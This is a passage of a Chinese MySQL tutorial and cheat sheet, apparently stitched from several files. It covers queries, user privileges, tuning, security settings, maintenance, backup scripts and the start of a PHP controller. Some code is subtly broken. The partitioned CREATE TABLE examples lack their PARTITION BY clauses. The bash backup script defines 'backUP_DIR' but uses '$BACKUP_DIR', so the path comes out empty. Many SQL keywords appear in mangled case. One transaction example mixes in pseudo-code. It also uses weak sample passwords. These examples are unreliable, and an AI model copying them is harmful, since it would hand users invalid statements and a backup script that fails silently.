 delete FROM users WHERE status = 0 AND created_at < '2024-01-01';
 delete FROM users;
 TRUNCATE TABLE users;
 DROP TABLE IF EXISTS users;
 delete FROM orders WHERE user_id = 1;
 ALTER TABLE orders ADD CONSTRAINT fk_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE;
 SELECT * FROM users WHERE id = 1;
 delete FROM users WHERE id = 1;
```

### 1.4 用户与权限详解

#### 1.4.1 用户管理

```sql
 CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
 CREATE USER 'newuser'@'%' IDENTIFIED BY 'password'; -- 允许远程连接
 CREATE USER 'newuser'@'192.168.1.%' IDENTIFIED BY 'password'; -- 允许特定网段
 ALTER USER 'newuser'@'localhost' IDENTIFIED BY 'new_password';
 SET PASSWORD FOR 'newuser'@'localhost' = 'new_password';
 DROP USER 'newuser'@'localhost';
 SELECT user, host FROM mysql.user;
 SHOW GRANTS FOR 'newuser'@'localhost';
 RENAME USER 'olduser'@'localhost' TO 'newuser'@'localhost';
```

#### 1.4.2 权限管理

```sql
 GRANT ALL PRIVILEGES ON mydb.* TO 'newuser'@'localhost';
 FLUSH PRIVILEGES;
 GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'newuser'@'localhost';
 GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost';
 GRANT CREATE USER ON *.* TO 'admin'@'localhost';
 GRANT RELOAD ON *.* TO 'admin'@'localhost';
 GRANT BACKUP ADMIN ON *.* TO 'admin'@'localhost';
 GRANT SELECT, INSERT ON mydb.orders TO 'newuser'@'localhost';
 GRANT EXECUTE ON PROCEDURE mydb.sp_name TO 'newuser'@'localhost';
 REVOKE ALL PRIVILEGES ON mydb.* FROM 'newuser'@'localhost';
 REVOKE DELETE ON mydb.* FROM 'newuser'@'localhost';
 CREATE ROLE 'app_read', 'app_write';
 GRANT SELECT ON mydb.* TO 'app_read';
 GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app_write';
 GRANT 'app_read' TO 'user1'@'localhost';
 GRANT 'app_write' TO 'user2'@'localhost';
 SET DEFAULT ROLE 'app_read' FOR 'user1'@'localhost';
```

#### 1.4.3 权限层级说明

| 层级     | 范围                 | 授予语法                                          |
| :------- | :------------------- | :------------------------------------------------ |
| 全局     | 所有数据库的所有对象 | `GRANT ALL ON *.* TO user`                        |
| 数据库   | 指定数据库的所有表   | `GRANT ALL ON mydb.* TO user`                     |
| 表       | 指定表的所有列       | `GRANT ALL ON mydb.orders TO user`                |
| 列       | 指定列               | `GRANT SELECT(col1, col2) ON mydb.orders TO user` |
| 存储过程 | 存储过程和函数       | `GRANT EXECUTE ON PROCEDURE mydb.sp TO user`      |

## 2. 性能优化建议

### 2.1 服务器配置优化详解

#### 2.1.1 内存配置

| 参数                    | 推荐值                     | 说明              |
| :---------------------- | :------------------------- | :---------------- |
| innodb_buffer_pool_size | 服务器内存的 70-80%        | 缓存数据和索引    |
| key_buffer_size         | 内存的 10-20%（仅 MyISAM） | MyISAM 索引缓存   |
| query_cache_size        | 不推荐（MySQL 8.0 已移除） | 查询缓存          |
| tmp_table_size          | 64-256MB                   | 临时表大小        |
| max_heap_table_size     | 64-256MB                   | Memory 表最大大小 |

#### 2.1.2 连接配置

```sql
 SET GLOBAL max_connections = 500;
 SET GLOBAL wait_timeout = 600;
 SET GLOBAL interactive_timeout = 600;
 SHOW STATUS LIKE 'Threads_connected';
 SHOW VARIABLES LIKE 'max_connections';
```

#### 2.1.3 InnoDB 配置

```ini
 [mysqld]
 # InnoDB 配置
 innodb_buffer_pool_size=4G # 建议为服务器内存的 70%
 innodb_log_file_size=1G # 建议 256MB-1GB
 innodb_log_buffer_size=64M
 innodb_flush_log_at_trx_commit=1 # 1-最安全，2-性能好，0-最快但可能丢数据
 innodb_flush_method=O_DIRECT # Linux 下推荐，减少系统缓存
 innodb_file_per_table=1 # 每个表独立的表空间
 innodb_io_capacity=4000 # 根据磁盘 IO 能力设置
```

### 2.2 查询优化详解

#### 2.2.1 索引优化

```sql
 CREATE INDEX idx_username ON users(username);
 CREATE INDEX idx_email_status ON users(email, status);
 CREATE INDEX idx_status_created ON users(status, created_at);
```

#### 2.2.2 SQL 语句优化

```sql
 SELECT * FROM users WHERE YEAR(created_at) = 2024;
 SELECT * FROM users WHERE created_at >= '2024-01-01' AND created_at < '2025-01-01';
 SELECT * FROM orders WHERE MONTH(order_time) = 1;
 SELECT * FROM orders WHERE order_time >= '2024-01-01' AND order_time < '2024-02-01';
 EXPLAIN SELECT * FROM users WHERE email = 'test@example.com';
```

#### 2.2.3 慢查询优化示例

```sql
 SET GLOBAL slow_query_log = 'ON';
 SET GLOBAL long_query_time = 1;
 SET GLOBAL slow_query_log_file = '/var/log/mysql/slow.log';
 SHOW FULL PROCESSLIST;
 EXPLAIN SELECT u.username, o.total_amount
 from users u
 inNER JOIN orders o ON u.id = o.user_id
 WHERE o.created_at > '2024-01-01';
```

### 2.3 存储引擎选择详解

| 存储引擎    | 事务支持 | 锁粒度 | 外键支持 | 特点                   | 适用场景                         |
| :---------- | :------- | :----- | :------- | :--------------------- | :------------------------------- |
| **InnoDB**  | 是       | 行级   | 是       | 支持事务、行级锁、MVCC | 大多数场景，特别是需要事务的系统 |
| **MyISAM**  | 否       | 表级   | 否       | 全文索引、压缩表       | 读多写少、日志、静态网站         |
| **Memory**  | 否       | 表级   | 否       | 内存存储，速度极快     | 临时表、缓存、会话数据           |
| **Archive** | 否       | 表级   | 否       | 高压缩比               | 归档数据、日志                   |
| **CSV**     | 否       | 表级   | 否       | CSV 格式               | 数据交换                         |

### 2.4 分区表详解

```sql
 CREATE TABLE sales (
  id BIGINT PRIMARY KEY AUTO_INCREMENT,
  sale_date DATE NOT NULL,
  amount DECIMAL(10,2) NOT NULL,
  region VARCHAR(50)
 )
  PARTITION p2020 VALUES LESS THAN (2021),
  PARTITION p2021 VALUES LESS THAN (2022),
  PARTITION p2022 VALUES LESS THAN (2023),
  PARTITION p2023 VALUES LESS THAN (2024),
  PARTITION p2024 VALUES LESS THAN (2025),
  PARTITION pmax VALUES LESS THAN MAXVALUE
 )
 CREATE TABLE users (
  id INT PRIMARY KEY,
  name VARCHAR(50)
 )
 CREATE TABLE products (
  id INT PRIMARY KEY,
  category_id INT,
  name VARCHAR(50)
 )
  PARTITION p_electronics VALUES IN (1, 2, 3),
  PARTITION p_clothing VALUES IN (4, 5, 6),
  PARTITION p_other VALUES IN (NULL)
 )
```

## 3. 安全配置详解

### 3.1 基础安全配置

```sql
 ALTER USER 'root'@'localhost' IDENTIFIED BY 'NewStrongPass@123';
 delete FROM mysql.user WHERE User = '';
 delete FROM mysql.user WHERE User = 'root' AND Host != 'localhost';
 FLUSH PRIVILEGES;
 CREATE USER 'app_user'@'%' IDENTIFIED BY 'AppPass@2024';
 GRANT SELECT, INSERT, UPDATE, DELETE ON production_db.* TO 'app_user'@'%';
 FLUSH PRIVILEGES;
 CREATE USER 'app_user'@'192.168.1.%' IDENTIFIED BY 'AppPass@2024';
 CREATE USER 'app_user'@'10.%.%.%' IDENTIFIED BY 'AppPass@2024';
```

### 3.2 SSL/TLS 配置

```sql
 SHOW VARIABLES LIKE 'have_ssl';
 SHOW VARIABLES LIKE 'have_openssl';
 ALTER USER 'root'@'localhost' REQUIRE SSL;
 SELECT user, host, ssl_type FROM mysql.user;
```

### 3.3 审计和监控

```sql
 SELECT * FROM mysql.general_log WHERE command_type='Connect' ORDER BY event_time DESC LIMIT 100;
 SELECT * FROM information_schema.processlist WHERE Command != 'Sleep' AND Time > 60;
 SELECT * FROM information_schema.innodb_lock_waits;
 SELECT * FROM information_schema.innodb_trx;
```

## 4. 常见问题与解决方案

### 4.1 连接问题

| 问题                             | 原因                               | 解决方案                           |
| :------------------------------- | :--------------------------------- | :--------------------------------- |
| **无法连接到 MySQL 服务器**      | 网络问题、防火墙、服务未启动       | 检查网络、防火墙、启动 MySQL 服务  |
| **连接被拒绝 (Access Denied)**   | 用户名/密码错误、IP 不在允许范围内 | 检查凭据、查看用户允许的 host      |
| **连接超时**                     | 网络延迟、服务器负载高             | 检查网络、服务器资源、优化查询     |
| **Too many connections**         | 连接数超过最大限制                 | 增加 max_connections、优化连接使用 |
| **Lost connection during query** | 查询返回数据过大、网络问题         | 增加 max_allowed_packet、优化查询  |

### 4.2 权限问题

| 问题             | 原因                  | 解决方案                              |
| :--------------- | :-------------------- | :------------------------------------ |
| **访问被拒绝**   | 权限不足、主机限制    | 检查用户权限、修改授权                |
| **无法创建用户** | 缺少 CREATE USER 权限 | 使用 root 用户或授予 CREATE USER 权限 |
| **权限不生效**   | 未刷新权限            | 执行 `FLUSH PRIVILEGES`               |
| **外键约束失败** | 关联数据不存在        | 先插入/更新主表数据，再操作从表       |

### 4.3 性能问题

| 问题             | 原因                                 | 解决方案                           |
| :--------------- | :----------------------------------- | :--------------------------------- |
| **查询速度慢**   | 缺少索引、SQL 写法不当、服务器配置低 | 添加索引、重写 SQL、提升服务器配置 |
| **服务器负载高** | 并发过高、复杂查询、资源不足         | 使用连接池、优化查询、增加资源     |
| **内存使用过高** | buffer_pool 过大、连接数过多         | 调整配置、限制连接数               |
| **磁盘 IO 高**   | 大量写入、缺少索引、缓冲池不足       | 优化索引、增加缓冲池、使用 SSD     |

### 4.4 数据问题

| 问题           | 原因                       | 解决方案                             |
| :------------- | :------------------------- | :----------------------------------- |
| **数据丢失**   | 误删除、硬件故障、事务回滚 | 使用备份恢复、启用 binlog 恢复       |
| **数据不一致** | 事务处理不当、外键约束错误 | 检查事务逻辑、修复外键约束           |
| **表损坏**     | 服务器异常关闭、磁盘故障   | 使用 `REPAIR TABLE` 修复或从备份恢复 |
| **字符集乱码** | 字符集不一致               | 统一使用 utf8mb4                     |

## 5. 监控与维护

### 5.1 常用监控命令

```sql
 SHOW STATUS; -- 所有状态变量
 SHOW GLOBAL STATUS; -- 全局状态
 SHOW VARIABLES; -- 所有配置变量
 SHOW GLOBAL VARIABLES;
 SHOW STATUS LIKE 'Threads_connected'; -- 当前连接数
 SHOW STATUS LIKE 'Max_used_connections'; -- 历史最大连接数
 SHOW STATUS LIKE 'Slow_queries'; -- 慢查询数量
 SHOW STATUS LIKE 'Innodb_row_lock%'; -- 锁等待情况
 SHOW STATUS LIKE 'Com_select'; -- 查询次数
 SHOW STATUS LIKE 'Com_insert'; -- 插入次数
 SHOW STATUS LIKE 'Com_update'; -- 更新次数
 SHOW STATUS LIKE 'Com_delete'; -- 删除次数
 SHOW PROCESSLIST;
 SHOW FULL PROCESSLIST;
 SHOW ENGINE INNODB STATUS;
 SHOW TABLE STATUS FROM database_name;
 SHOW INDEX FROM table_name;
```

### 5.2 定期维护任务

```sql
 ANALYZE TABLE users;
 CHECK TABLE users;
 REPAIR TABLE users;
 OPTIMIZE TABLE users;
 ANALYZE TABLE users;
 PURGE BINARY LOGS BEFORE '2024-01-01 00:00:00';
 PURGE BINARY LOGS TO 'mysql-bin.000010';
 SELECT TABLE_NAME, Data_free FROM information_schema.tables WHERE Data_free > 0;
```

### 5.3 备份策略

```bash
 #!/bin/bash
 # 每日备份脚本示例
 backUP_DIR="/backup/mysql"
 DATE=$(date +%Y%m%d)
 MYSQL_USER="backup_user"
 MYSQL_PASS="backup_password"
 # 创建备份目录
 mkdir -p $BACKUP_DIR
 # 备份所有数据库
 mysqldump -u$MYSQL_USER -p$MYSQL_PASS --all-databases --routines --triggers --events > $BACKUP_DIR/all_db_$DATE.sql
 # 压缩备份
 gzip $BACKUP_DIR/all_db_$DATE.sql
 # 删除 7 天前的备份
 find $BACKUP_DIR -name "*.sql.gz" -mtime +7 -delete
 # 备份完成
 echo "Backup completed: $DATE"
```

<!-- ============ 文档分隔线：020-mysql/075-MySQLQuickLookup.md ============ -->

## 1. 数据库操作

### 创建数据库

```sql
 CREATE DATABASE dbname;
 CREATE DATABASE IF NOT EXISTS dbname;
```

### 创建数据库（指定字符集）

```sql
 CREATE DATABASE dbname
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
 CREATE DATABASE ecommerce
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
```

### 修改数据库字符集

```sql
 ALTER DATABASE dbname
  CHARACTER SET gbk
  COLLATE gbk_chinese_ci;
```

### 查看数据库

```sql
 SHOW DATABASES;
 SHOW CREATE DATABASE dbname;
 SELECT table_schema AS '数据库',
  SUM(data_length + index_length) / 1024 / 1024 AS '大小(MB)'
 from information_schema.tables
 GROUP BY table_schema;
```

### 使用数据库

```sql
 use dbname;
```

### 删除数据库

```sql
 DROP DATABASE dbname;
 DROP DATABASE IF EXISTS dbname;
```

---

## 2. 表操作

### 创建表

```sql
 CREATE TABLE tablename (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(50) NOT NULL,
  age INT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
 )
 CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT COMMENT '用户ID',
  username VARCHAR(50) NOT NULL UNIQUE COMMENT '用户名',
  email VARCHAR(100) NOT NULL UNIQUE COMMENT '邮箱',
  password VARCHAR(255) NOT NULL COMMENT '密码',
  age TINYINT UNSIGNED COMMENT '年龄',
  status TINYINT DEFAULT 1 COMMENT '状态: 0禁用, 1启用',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间'
 )
```

### 查看表

```sql
 SHOW TABLES;
 DESC tablename;
 SHOW COLUMNS FROM tablename;
 SHOW CREATE TABLE tablename;
 SELECT table_name AS '表名',
  data_length / 1024 / 1024 AS '数据大小(MB)',
  index_length / 1024 / 1024 AS '索引大小(MB)'
 from information_schema.tables
 WHERE table_schema = DATABASE();
```

### 修改表结构

```sql
 ALTER TABLE tablename ADD COLUMN colname type;
 ALTER TABLE tablename ADD COLUMN colname type AFTER another_col;
 ALTER TABLE tablename MODIFY COLUMN colname new_type;
 ALTER TABLE tablename CHANGE COLUMN oldname newname new_type;
 ALTER TABLE tablename DROP COLUMN colname;
 ALTER TABLE oldname RENAME TO newname;
 ALTER TABLE users ADD COLUMN phone VARCHAR(20) AFTER email;
 ALTER TABLE users MODIFY COLUMN age SMALLINT UNSIGNED;
 ALTER TABLE users CHANGE COLUMN phone mobile VARCHAR(20);
 ALTER TABLE users DROP COLUMN age;
```

### 删除表

```sql
 DROP TABLE tablename;
 DROP TABLE IF EXISTS tablename;
```

### 清空表

```sql
 TRUNCATE TABLE tablename;
```

### 复制表

```sql
 CREATE TABLE newtable LIKE oldtable;
 CREATE TABLE newtable AS SELECT * FROM oldtable;
 CREATE TABLE active_users AS SELECT * FROM users WHERE status = 1;
```

---

## 3. 数据类型

### 字符型

- CHAR(n) - 定长字符串，最多255字符
- VARCHAR(n) - 变长字符串，最多65535字符
- TEXT - 长文本，最多65535字符
- MEDIUMTEXT - 中等文本，最多16MB
- LONGTEXT - 超长文本，最多4GB
- ENUM - 枚举类型
- SET - 集合类型
- BLOB - 二进制大对象

### 数值型

- TINYINT - 微整数 (-128~127)
- SMALLINT - 小整数 (-32768~32767)
- MEDIUMINT - 中等整数
- INT - 整数 (-21亿~21亿)
- BIGINT - 大整数
- FLOAT - 单精度浮点
- DOUBLE - 双精度浮点
- DECIMAL(M,D) - 定点数

### 日期时间型

- DATE - 日期 (YYYY-MM-DD)
- TIME - 时间 (HH:MM:SS)
- DATETIME - 日期时间
- TIMESTAMP - 时间戳
- YEAR - 年份

---

## 4. 约束类型

### 常用约束

```sql
 CREATE TABLE tablename (
  id INT PRIMARY KEY AUTO_INCREMENT, -- 主键 + 自增
  name VARCHAR(50) NOT NULL, -- 非空
  email VARCHAR(100) UNIQUE, -- 唯一
  status TINYINT DEFAULT 1, -- 默认值
  age INT CHECK (age > 0), -- 检查约束
  user_id INT,
  FOREIGN KEY (user_id) REFERENCES users(id) -- 外键
 )
```

### 外键约束选项

```sql
 forEIGN KEY (col) REFERENCES parent_table(col)
  ON DELETE CASCADE -- 级联删除
  ON UPDATE CASCADE -- 级联更新
  ON DELETE SET NULL -- 删除时设为NULL
  ON DELETE RESTRICT -- 限制删除
```

---

## 5. 数据操作

### 插入数据

```sql
 inSERT INTO table(col1, col2) VALUES(val1, val2);
 inSERT INTO table(col1, col2) VALUES
  (v1, v2),
  (v3, v4),
  (v5, v6);
 inSERT INTO table(cols) VALUES(vals)
 ON DUPLICATE KEY UPDATE col = new_val;
 replace INTO table(cols) VALUES(vals);
 inSERT INTO users(username, email, password)
 VALUES ('zhangsan', 'zhang@example.com', '123456');
 inSERT INTO users(username, email, password) VALUES
  ('lisi', 'li@example.com', '654321'),
  ('wangwu', 'wang@example.com', 'abc123'),
  ('zhaoliu', 'zhao@example.com', 'xyz789');
 inSERT INTO users(id, username, email)
 VALUES (1, 'zhangsan_new', 'zhang_new@example.com')
 ON DUPLICATE KEY UPDATE username = VALUES(username), email = VALUES(email);
```

### 更新数据

```sql
 UPDATE table SET col = val WHERE condition;
 UPDATE table SET col1 = val1, col2 = val2 WHERE condition;
 UPDATE users SET status = 0 WHERE id = 1;
 UPDATE users SET status = 1 WHERE created_at > '2024-01-01';
 UPDATE orders o
 JOIN users u ON o.user_id = u.id
 SET o.user_name = u.username
 WHERE o.user_name IS NULL;
```

### 删除数据

```sql
 delete FROM table WHERE condition; -- 按条件删除
 delete FROM table; -- 删除所有行
 TRUNCATE TABLE table; -- 清空表（重置自增ID）
 delete FROM users WHERE id = 1;
 delete FROM logs WHERE created_at < '2024-01-01';
 delete o FROM orders o
 JOIN users u ON o.user_id = u.id
 WHERE u.status = 0;
```

---

## 6. 数据查询

### 基础查询

```sql
 SELECT * FROM table;
 SELECT col1, col2 FROM table;
 SELECT col1 AS alias FROM table;
 SELECT DISTINCT col FROM table;
 SELECT id, username, email FROM users WHERE status = 1;
 SELECT COUNT(*) AS user_count FROM users;
```

### 条件查询

```sql
 SELECT * FROM table WHERE col = value;
 SELECT * FROM table WHERE col > value;
 SELECT * FROM table WHERE col != value;
 SELECT * FROM table WHERE col1 = v1 AND col2 = v2;
 SELECT * FROM table WHERE col1 = v1 OR col2 = v2;
 SELECT * FROM table WHERE NOT col = value;
 SELECT * FROM table WHERE col BETWEEN val1 AND val2;
 SELECT * FROM table WHERE col IN (val1, val2, val3);
 SELECT * FROM table WHERE col LIKE '%pattern%';
 SELECT * FROM table WHERE col LIKE 'pattern%';
 SELECT * FROM table WHERE col LIKE '_pattern';
 SELECT * FROM table WHERE col IS NULL;
 SELECT * FROM table WHERE col IS NOT NULL;
 SELECT * FROM users WHERE age BETWEEN 18 AND 30;
 SELECT * FROM users WHERE city IN ('北京', '上海', '广州');
 SELECT * FROM users WHERE username LIKE '%zhang%';
 SELECT * FROM users WHERE phone IS NULL;
```

### 排序与分页

```sql
 SELECT * FROM table ORDER BY col ASC;
 SELECT * FROM table ORDER BY col DESC;
 SELECT * FROM table ORDER BY col1 ASC, col2 DESC;
 SELECT * FROM table LIMIT 10;
 SELECT * FROM table LIMIT 10 OFFSET 20;
 SELECT * FROM table LIMIT 20, 10;
 SELECT * FROM users ORDER BY created_at DESC;
 SELECT * FROM users ORDER BY created_at DESC LIMIT 20, 10;
```

### 分组查询

```sql
 SELECT col, COUNT(*) FROM table GROUP BY col;
 SELECT col, AVG(price) FROM table
 GROUP BY col
 HAVING AVG(price) > 100;
 SELECT city, COUNT(*) AS user_count
 from users
 GROUP BY city
 ORDER BY user_count DESC;
 SELECT DATE_FORMAT(created_at, '%Y-%m') AS month,
  COUNT(*) AS register_count
 from users
 GROUP BY month
 ORDER BY month;
 SELECT user_id, SUM(amount) AS total_amount
 from orders
 GROUP BY user_id
 HAVING total_amount > 1000;
```

### 聚合函数

```sql
 SELECT
  COUNT(*) AS total, -- 统计行数
  SUM(price) AS sum, -- 求和
  AVG(price) AS avg, -- 平均值
  MAX(price) AS max, -- 最大值
  MIN(price) AS min -- 最小值
 from table;
 SELECT
  COUNT(*) AS order_count,
  SUM(amount) AS total_amount,
  AVG(amount) AS avg_amount,
  MAX(amount) AS max_amount,
  MIN(amount) AS min_amount
 from orders
 WHERE created_at BETWEEN '2024-01-01' AND '2024-01-31';
```

### 多表连接

```sql
 SELECT * FROM a INNER JOIN b ON a.id = b.id;
 SELECT * FROM a LEFT JOIN b ON a.id = b.id;
 SELECT * FROM a RIGHT JOIN b ON a.id = b.id;
 SELECT * FROM a LEFT JOIN b ON a.id = b.id
 UNION
 SELECT * FROM a RIGHT JOIN b ON a.id = b.id;
 SELECT e1.name, e2.name AS manager
 from employees e1
 JOIN employees e2 ON e1.manager_id = e2.id;
 SELECT o.id, o.amount, o.created_at,
  u.username, u.email
 from orders o
 JOIN users u ON o.user_id = u.id
 WHERE o.created_at > '2024-01-01';
 SELECT u.username, COUNT(o.id) AS order_count
 from users u
 LEFT JOIN orders o ON u.id = o.user_id
 GROUP BY u.id;
```

---

## 7. 索引操作

### 创建索引

```sql
 CREATE INDEX idx_name ON table(col);
 CREATE UNIQUE INDEX idx_name ON table(col);
 CREATE INDEX idx_name ON table(col1, col2);
 ALTER TABLE table ADD FULLTEXT INDEX ft_idx(col);
 CREATE INDEX idx_users_email ON users(email);
 CREATE INDEX idx_users_status ON users(status);
 CREATE INDEX idx_users_created_at ON users(created_at);
 CREATE UNIQUE INDEX idx_users_username ON users(username);
 CREATE INDEX idx_orders_user_date ON orders(user_id, created_at);
```

### 查看索引

```sql
 SHOW INDEX FROM table;
 SELECT index_name, column_name
 from information_schema.statistics
 WHERE table_schema = DATABASE() AND table_name = 'users';
```

### 删除索引

```sql
 DROP INDEX idx_name ON table;
 DROP INDEX idx_users_email ON users;
```

---

## 8. 用户与权限

### 用户管理

```sql
 CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';
 CREATE USER 'username'@'%' IDENTIFIED BY 'password'; -- 允许远程
 ALTER USER 'username'@'localhost' IDENTIFIED BY 'new_password';
 DROP USER 'username'@'localhost';
 SELECT user, host FROM mysql.user;
 CREATE USER 'readonly'@'%' IDENTIFIED BY 'read123';
 CREATE USER 'admin'@'localhost' IDENTIFIED BY 'admin123';
```

### 权限管理

```sql
 GRANT ALL PRIVILEGES ON dbname.* TO 'username'@'localhost';
 GRANT SELECT, INSERT, UPDATE ON dbname.table TO 'username'@'localhost';
 REVOKE ALL PRIVILEGES ON dbname.* FROM 'username'@'localhost';
 SHOW GRANTS FOR 'username'@'localhost';
 FLUSH PRIVILEGES;
 GRANT SELECT ON ecommerce.* TO 'readonly'@'%';
 GRANT SELECT, INSERT, UPDATE, DELETE ON ecommerce.* TO 'appuser'@'%';
 GRANT ALL PRIVILEGES ON *.* TO 'admin'@'localhost' WITH GRANT OPTION;
```

### 常用权限

- ALL PRIVILEGES - 所有权限
- SELECT, INSERT, UPDATE, DELETE - 基本操作
- CREATE, DROP - 创建/删除
- GRANT OPTION - 授权权限
- ALTER - 修改表结构
- INDEX - 创建索引

---

## 9. 事务管理

### 基本操作

```sql
 START TRANSACTION;
 BEGIN;
 commit;
 ROLLBACK;
 SAVEPOINT savepoint_name;
 ROLLBACK TO SAVEPOINT savepoint_name;
 BEGIN;
 UPDATE accounts SET balance = balance - 100 WHERE id = 1;
 UPDATE accounts SET balance = balance + 100 WHERE id = 2;
 commit;
 BEGIN;
 inSERT INTO orders (...) VALUES (...);
 SAVEPOINT order_saved;
 inSERT INTO order_items (...) VALUES (...);
 if error THEN
  ROLLBACK TO order_saved;
 END IF;
 commit;
```

### 隔离级别

```sql
 SELECT @@transaction_isolation;
 SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
 SET GLOBAL TRANSACTION ISOLATION LEVEL REPEATABLE READ;
```

### 隔离级别说明

- READ UNCOMMITTED - 最低级别，可能读取未提交数据
- READ COMMITTED - 读取已提交数据
- REPEATABLE READ - 可重复读（MySQL默认）
- SERIALIZABLE - 最高级别，串行执行

---

## 10. 常用函数

### 字符串函数

```sql
 CONCAT('Hello', ' ', 'World') -- 拼接字符串
 SUBSTRING('Hello', 1, 3) -- 截取字符串
 LENGTH('Hello') -- 字节长度
 CHAR_LENGTH('你好') -- 字符长度
 LOWER('HELLO') -- 转小写
 UPPER('hello') -- 转大写
 TRIM(' hello ') -- 去除首尾空格
 replace('Hello', 'l', 'w') -- 替换字符串
 LEFT('Hello', 2) -- 取左边字符
 RIGHT('Hello', 2) -- 取右边字符
 inSTR('Hello', 'll') -- 查找位置
 SELECT CONCAT(last_name, ' ', first_name) AS full_name FROM users;
 SELECT SUBSTRING(email, INSTR(email, '@') + 1) AS domain FROM users;
 SELECT LOWER(CONCAT(SUBSTRING(first_name, 1, 1), last_name)) AS username FROM users;
```

### 日期函数

```sql
 NOW() -- 当前日期时间
 CURDATE() -- 当前日期
 CURTIME() -- 当前时间
 YEAR(NOW()) -- 提取年份
 MONTH(NOW()) -- 提取月份
 DAY(NOW()) -- 提取日期
 HOUR(NOW()) -- 提取小时
 MINUTE(NOW()) -- 提取分钟
 SECOND(NOW()) -- 提取秒
 DATE_ADD(NOW(), INTERVAL 7 DAY) -- 日期加
 DATE_SUB(NOW(), INTERVAL 1 MONTH) -- 日期减
 DATEDIFF('2024-01-15', '2024-01-01') -- 日期差
 DATE_FORMAT(NOW(), '%Y-%m-%d') -- 格式化日期
 LAST_DAY(NOW()) -- 月份最后一天
 SELECT * FROM users WHERE DATE_FORMAT(created_at, '%Y-%m') = DATE_FORMAT(NOW(), '%Y-%m');
 SELECT TIMESTAMPDIFF(YEAR, birthday, CURDATE()) AS age FROM users;
 SELECT DATE_SUB(CURDATE(), INTERVAL WEEKDAY(CURDATE()) DAY) AS monday;
```

### 数值函数

```sql
 ABS(-10) -- 绝对值
 ROUND(3.14159, 2) -- 四舍五入
 CEIL(3.1) -- 向上取整
 FLOOR(3.9) -- 向下取整
 MOD(10, 3) -- 取模
 POW(2, 3) -- 幂运算
 SQRT(16) -- 平方根
 RAND() -- 随机数
 TRUNCATE(3.14159, 3) -- 截断
 SIGN(-10) -- 符号
 SELECT ROUND(AVG(rating), 1) AS avg_rating FROM products;
 SELECT FLOOR(RAND() * 9000 + 1000) AS captcha;
 SELECT price * 0.8 AS discounted_price FROM products;
```

### 条件函数

```sql
 if(age >= 18, '成人', '未成年') -- 条件判断
 ifNULL(email, '未填写') -- NULL替换
 NULLIF(a, b) -- 相等返回NULL
 case
  WHEN score >= 90 THEN '优秀'
  WHEN score >= 60 THEN '及格'
  ELSE '不及格'
 END -- 多条件判断
 SELECT id, username, IF(status = 1, '活跃', '禁用') AS status_text FROM users;
 SELECT
  username,
  CASE
  WHEN points >= 1000 THEN 'VIP'
  WHEN points >= 500 THEN '高级会员'
  ELSE '普通会员'
  END AS level
 from users;
 SELECT name, IFNULL(phone, '未填写') AS phone FROM customers;
```

---

## 附录：常用命令

### 服务器管理

```bash
 # 启动服务
 systemctl start mysql # Linux
 net start MySQL # Windows
 # 停止服务
 systemctl stop mysql # Linux
 net stop MySQL # Windows
 # 重启服务
 systemctl restart mysql # Linux
 # 查看状态
 systemctl status mysql # Linux
 # 登录
 mysql -u username -p
 mysql -u username -p -h host -P port
```

### 备份与恢复

```bash
 # 备份数据库
 mysqldump -u username -p dbname > backup.sql
 # 备份多个数据库
 mysqldump -u username -p --databases db1 db2 > backup.sql
 # 备份所有数据库
 mysqldump -u username -p --all-databases > all_backup.sql
 # 恢复数据库
 mysql -u username -p dbname < backup.sql
 # 压缩备份
 mysqldump -u username -p dbname | gzip > backup.sql.gz
 # 恢复压缩备份
 gunzip < backup.sql.gz | mysql -u username -p dbname
```

### 查看系统信息

```sql
 SELECT VERSION(); -- 版本
 SELECT USER(); -- 当前用户
 SELECT DATABASE(); -- 当前数据库
 SHOW STATUS; -- 服务器状态
 SHOW VARIABLES; -- 配置变量
 SHOW PROCESSLIST; -- 进程列表
 SHOW VARIABLES LIKE 'slow_query%'; -- 慢查询状态
```

<!-- ============ 文档分隔线：020-mysql/076-MySQLControlApplication.md ============ -->

## 1. 控制器概述 | Controller Overview

控制器是连接用户界面与数据库的中间层，负责处理用户请求、执行数据库操作、返回处理结果。在MySQL应用中，控制器扮演着重要的角色，确保数据操作的安全性、一致性和高效性。

### 1.1 控制器的核心职责

- **请求处理**：接收并解析用户请求
- **业务逻辑**：执行相关业务逻辑
- **数据操作**：与数据库进行交互
- **结果返回**：将处理结果返回给用户

### 1.2 控制器的设计原则

- **单一职责**：每个控制器只负责特定功能
- **可复用性**：提取通用逻辑，提高代码复用率
- **安全性**：防止SQL注入等安全问题
- **可测试性**：便于单元测试和集成测试

## 2. 控制器实现方式 | Implementation Methods

### 2.1 基于PHP的控制器实现

```php
 <?php
 class UserController {
  private $pdo;
  public function __construct($pdo) {
  $this->pdo = $pdo;
  }
  // 获取用户列表
  public function getUsers() {
  $stmt = $this->pdo->query("SELECT * FROM users");
  return $stmt->fetchAll(PDO::FETCH_ASSOC);
  }
  // 根据ID获取用户
  public function getUserById($id) {
  $stmt = $this->pdo->prepare("SELECT * FROM users WHERE id = :id");
  $stmt->execute(['id' => $id]);
  return $stmt->fetch(PDO::FETCH_ASSOC);
  }
  // 创建新用户
  public function createUser($name, $email) {
  $stmt = $this->pdo->prepare("INSERT INTO users (name, email) VALUES (:name, :email)");
  return $stmt->execute(['name' => $name, 'email' => $email]);
  }
  // 更新用户信息
  public function updateUser($id, $name, $email) {
  $stmt = $this->pdo->prepare("UPDATE users SET name = :name, email = :email WHERE id = :id");
  return $stmt->execute(['id' => $id, 'name' => $name, 'email' => $email]);
  }
  // 删除用户
  public function deleteUser($id) {
